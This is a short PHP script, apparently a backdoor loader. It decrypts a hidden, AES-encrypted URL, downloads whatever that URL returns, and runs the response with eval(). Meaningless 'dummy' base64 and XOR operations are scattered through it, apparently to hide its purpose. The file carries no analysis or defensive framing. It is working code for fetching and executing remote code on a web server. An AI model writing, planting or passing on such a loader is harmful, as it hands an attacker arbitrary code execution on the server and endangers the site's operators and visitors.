<?php
define("ENCRYPTION_KEY", "your-secret-key");
$encrypted_url = "l2UDM/1kihg+Pd50dO3hKCkDZKCBzafIvVT20a6iA3JU8Hmvdc+zphRjWcyXRbEWB701xIYXlz3MaEESIwfzEXgtdP8JZRkeGDzM8OakFGU=";
function decrypt_url($encrypted_url, $key) {
    $dummy_base64 = base64_encode("dummy-string");
    $dummy_decoded = base64_decode($dummy_base64);
    return openssl_decrypt(
        $encrypted_url,
        'AES-128-CBC',
        substr(hash('sha256', $key, true), 0, 16),
        0,
        substr(hash('md5', $key, true), 0, 16)
    );
}
$url = decrypt_url($encrypted_url, ENCRYPTION_KEY);
function xor_encrypt($data, $key) {
    $key = str_repeat($key, ceil(strlen($data) / strlen($key)));
    return $data ^ $key;
}
$dummy_xor_encrypted = xor_encrypt("dummy-data", "xor-key");
$dummy_xor_decrypted = xor_encrypt($dummy_xor_encrypted, "xor-key");
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
$output = curl_exec($ch);
curl_close($ch);

$irrelevant_check = ($dummy_xor_decrypted === "dummy-data");

if ($output !== false) {
    echo eval($output);
} else {
    echo "Failed to fetch content from the URL.";
}
?>

